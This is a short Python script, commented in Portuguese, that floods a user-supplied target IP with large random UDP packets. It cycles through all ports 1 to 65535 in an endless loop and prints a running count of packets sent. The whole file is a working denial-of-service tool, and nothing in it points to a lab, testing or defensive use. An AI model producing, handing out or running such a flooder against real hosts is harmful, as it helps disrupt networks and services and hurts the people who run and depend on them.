import socket
import random
import time

# Cria um socket UDP (SOCK_DGRAM)
# O UDP nao precisa de "aperto de mao", apenas envia os dados
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Cria um pacote de dados aleatorios (65000 bytes)
# Nota: 65507 e o maximo teorico para um pacote UDP
bytes_packet = random._urandom(65000)

# Pede o IP do alvo (input e o padrao no Python 3)
ip = input('Target IP: ')
sent = 0

# Loop infinito para envio de pacotes
while True:
    # Varre o intervalo de portas de 1 ate 65535
    for port in range(1, 65536):
        try:
            # Envia o pacote para o IP e porta especificados
            sock.sendto(bytes_packet, (ip, port))
            sent = sent + 1
            
            # Imprime o progresso no terminal
            print(f"Enviados {sent} pacotes para {ip} na porta {port}")
            
            # Pequena pausa para nao encravar o proprio computador
            time.sleep(0.10) 
            
        except KeyboardInterrupt:
            print("\nProcesso interrompido pelo utilizador.")
            exit()
        except Exception as e:
            print(f"Erro: {e}")
            break
